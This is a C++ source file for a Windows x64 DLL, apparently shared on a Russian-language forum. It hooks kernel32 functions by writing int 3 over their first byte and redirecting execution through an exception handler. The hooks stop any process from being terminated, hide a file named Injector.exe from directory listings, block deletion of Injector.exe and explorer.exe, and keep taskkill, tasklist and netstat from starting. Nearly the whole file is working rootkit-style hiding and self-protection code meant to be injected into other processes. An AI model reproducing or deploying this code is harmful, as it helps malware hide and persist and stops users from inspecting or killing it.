/*
Хай всем, ловите перехват функций в x64 методом сплайсинга, 
записывая вместо первого байта инструкцию int 3 и устанавливая свой обработчик исключений.

Перехват TerminateProcess, запрещая терминаторить любые процессы, запрещение удаления файлов с именами explorer.exe, 
Injector.exe с помощью нагибания DeleteFileW. Перехват CreateProcessW, 
благодаря чему - запрет на запуск netstat, tasklist, taskkill из cmd.exe и explorer.exe - Win + R. 

*/
#include <windows.h>
#include <imagehlp.h>
#include <psapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "imagehlp.lib")
#pragma comment(linker, "/MACHINE:X64 /ENTRY:DllMain")


HRESULT WriteProtectedMemory(LPVOID pDest, LPCVOID pSrc, DWORD dwSize);
LRESULT Hook(char *FunctionName, char *ModuleName);

int count = 0;

DWORD_PTR m_dwFunction;
DWORD_PTR m_DeleteFunction;
DWORD_PTR mTerminateProcess;
DWORD_PTR mCreateProcess;
BYTE nSavedByte;
BYTE nSavedDelete;
BYTE nSavedTerminator;
BYTE nSavedProcessCreation;

HRESULT __fastcall UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA)
{

    ULONG cbAnsi, cCharacters;
    DWORD dwError;
    if (pszW == NULL)
    {
        *ppszA = NULL;
        return NOERROR;
    }

    cCharacters = wcslen(pszW) + 1;
    cbAnsi = cCharacters * 2;

    *ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
    if (NULL == *ppszA)
        return E_OUTOFMEMORY;

    if (0 == WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA,
        cbAnsi, NULL, NULL))
    {
        dwError = GetLastError();
        CoTaskMemFree(*ppszA);
        *ppszA = NULL;
        return HRESULT_FROM_WIN32(dwError);
    }
    return NOERROR;

}

BOOL  WINAPI MyCreateProcessW(LPCWSTR lpApplicationName, LPWSTR  lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles,
     DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory,  LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION  lpProcessInformation)
{
    wchar_t SystemDir[MAX_PATH];
    GetSystemDirectory(SystemDir, MAX_PATH);
    wsprintfW(SystemDir, L"%s\\taskkill.exe", SystemDir);
    if (lstrcmpW(lpApplicationName, SystemDir) == 0)
    {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return 0;
    }
    if (lstrcmpW(lpCommandLine, L"tasklist") == 0)
    {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return false;
    }
    LPSTR Ansi;
    UnicodeToAnsi(lpCommandLine, &Ansi);
    bool t = true;
    char str[MAX_PATH];
    int i;
    for (i = 0; ((i < lstrlenA(Ansi)) && (Ansi[i] != ' ')); i++)
        str[i] = Ansi[i];
    str[i] = 0;
    if (lstrcmpA(str, "taskkill") == 0) 
    {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return false;
    }
    if (lstrcmpA(str, "netstat") == 0)
    {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return false;
    }
    WriteProtectedMemory(LPVOID(mCreateProcess), &nSavedProcessCreation, sizeof(BYTE));
    BOOL result = CreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
        bInheritHandles, dwCreationFlags, lpEnvironment,
        lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
    Hook("CreateProcessW", "Kernel32.dll");
    return result;
}

BOOL WINAPI MyTerminateProcess(HANDLE hProcess, UINT uExitCode)
{
    /*char szName[MAX_PATH];
    GetProcessImageFileNameA(hProcess, szName, MAX_PATH);
    if (strcmp(szName, "Injector.exe") == 0)
    {
        SetLastError(ERROR_ACCESS_DENIED);
        return false;
    }
    else
    {*/
        //WriteProtectedMemory(LPVOID(mTerminateProcess), &nSavedTerminator, sizeof(BYTE));
        //TerminateProcess(hProcess, uExitCode);
        //Hook("TerminateProcess", "Kernel32.dll");
        SetLastError(ERROR_PROC_NOT_FOUND);
        return 0;
    //}
}


BOOL WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData)
{
    WriteProtectedMemory(LPVOID(m_dwFunction), &nSavedByte, sizeof(BYTE));
    bool result = FindNextFileW(hFindFile, lpFindFileData);
    DWORD LastError = GetLastError();
    if (lstrcmpW(lpFindFileData->cFileName, L"Injector.exe") == 0)
    {
        wsprintfW(lpFindFileData->cFileName, L"System");
    }
    Hook("FindNextFileW", "Kernel32.dll");
    SetLastError(LastError);
    return result;
}




BOOL WINAPI MyDeleteFileW(LPCWSTR lpFileName)
{
    LPSTR Ansi;
    UnicodeToAnsi(lpFileName, &Ansi);
    char szName[MAX_PATH];
    int j = 0;
    for (int i = lstrlenA(Ansi) - 1; Ansi[i] != '\\'; i--, j++)
        szName[j] = Ansi[i];
    if (lstrcmpA(szName, "exe.rotcejnI") == 0)
    {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return false;
    }
    else if (lstrcmpA(szName, "exe.erolpxe") == 0)
    {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return false;
    }
    WriteProtectedMemory(LPVOID(m_DeleteFunction), &nSavedDelete, sizeof(BYTE));
    bool result = DeleteFileW(lpFileName);
    DWORD LastError = GetLastError();
    Hook("DeleteFileW", "Kernel32.dll");
    SetLastError(LastError);
    return result;
}


HRESULT WriteProtectedMemory(LPVOID pDest, LPCVOID pSrc, DWORD dwSize)
{
    DWORD dwOldProtect = 0;
    if (VirtualProtect(pDest, dwSize, PAGE_READWRITE, &dwOldProtect))
    {
        MoveMemory(pDest, pSrc, dwSize);

        VirtualProtect(pDest, dwSize, dwOldProtect, &dwOldProtect);
        return S_OK;
    }
    return HRESULT_FROM_WIN32(GetLastError());
}





LONG WINAPI MyUnhandledExceptionFilter(PEXCEPTION_POINTERS pExceptionInfo)
{

    if (pExceptionInfo->ContextRecord->Rip != m_dwFunction)
    {
    if (pExceptionInfo->ContextRecord->Rip != m_DeleteFunction)
    {
    if (pExceptionInfo->ContextRecord->Rip != mTerminateProcess)
    {
    if (pExceptionInfo->ContextRecord->Rip != mCreateProcess)
    {
    return EXCEPTION_CONTINUE_SEARCH;
    }
    }
    }
    }

     if (pExceptionInfo->ContextRecord->Rip == mCreateProcess)  pExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyCreateProcessW;
     if (pExceptionInfo->ContextRecord->Rip == mTerminateProcess)  pExceptionInfo->ContextRecord->Rip =  (DWORD_PTR)MyTerminateProcess;
    if  (pExceptionInfo->ContextRecord->Rip == m_dwFunction)  pExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyFindNextFileW;
     if (pExceptionInfo->ContextRecord->Rip == m_DeleteFunction)  pExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyDeleteFileW;
    return EXCEPTION_CONTINUE_EXECUTION;
    
/*    if (pExceptionInfo->ContextRecord->Eip != m_dwFunction)
    {
        if (pExceptionInfo->ContextRecord->Eip != m_DeleteFunction)
        {
            if (pExceptionInfo->ContextRecord->Eip != mTerminateProcess)
            {
                if (pExceptionInfo->ContextRecord->Eip != mCreateProcess)
                {
                    return EXCEPTION_CONTINUE_SEARCH;
                }
            }
        }
    }

     if (pExceptionInfo->ContextRecord->Eip == mCreateProcess)  pExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyCreateProcessW;
     if (pExceptionInfo->ContextRecord->Eip == mTerminateProcess)  pExceptionInfo->ContextRecord->Eip =  (DWORD_PTR)MyTerminateProcess;
    if  (pExceptionInfo->ContextRecord->Eip == m_dwFunction)  pExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyFindNextFileW;
     if (pExceptionInfo->ContextRecord->Eip == m_DeleteFunction)  pExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyDeleteFileW;
    return EXCEPTION_CONTINUE_EXECUTION;*/
}



LRESULT Hook(char *FunctionName, char *ModuleName)
{
    if (GetModuleHandleA(ModuleName) == 0) LoadLibraryA(ModuleName);
    DWORD_PTR m_dwFunction_local = (DWORD_PTR)GetProcAddress(GetModuleHandleA(ModuleName), FunctionName);

    if (strcmp(FunctionName, "FindNextFileW") == 0)
    {
        m_dwFunction = m_dwFunction_local;
        nSavedByte = *(LPBYTE)m_dwFunction_local;
    }
    if (strcmp(FunctionName, "TerminateProcess") == 0)
    {
        mTerminateProcess = m_dwFunction_local;
        nSavedTerminator = *(LPBYTE)m_dwFunction_local;
    }
    if (strcmp(FunctionName, "DeleteFileW") == 0)
    {
        m_DeleteFunction = m_dwFunction_local;
        nSavedDelete = *(LPBYTE)m_dwFunction_local;
    }
    if (strcmp(FunctionName, "CreateProcessW") == 0)
    {
        mCreateProcess = m_dwFunction_local;
        nSavedProcessCreation = *(LPBYTE)m_dwFunction_local;
    }

    LPTOP_LEVEL_EXCEPTION_FILTER pOldFilter = SetUnhandledExceptionFilter(MyUnhandledExceptionFilter);

    const BYTE nInt3 = 0xCC;
    HRESULT hr = WriteProtectedMemory(LPVOID(m_dwFunction_local), &nInt3, sizeof(const BYTE));

    return 0;
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    wchar_t Windows[MAX_PATH];
    wchar_t CurrentModule[MAX_PATH];
    GetWindowsDirectoryW(Windows, MAX_PATH);
    GetModuleFileNameW(0, CurrentModule, MAX_PATH);
    wsprintfW(Windows, L"%s\\%s", Windows, L"explorer.exe");
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        if (lstrcmpW(Windows, CurrentModule) != 0)
        {
            Hook("TerminateProcess", "Kernel32.dll");
            Hook("FindNextFileW", "Kernel32.dll");
        }
        Hook("CreateProcessW", "Kernel32.dll");
        Hook("DeleteFileW", "Kernel32.dll");
    }
    return TRUE;
}
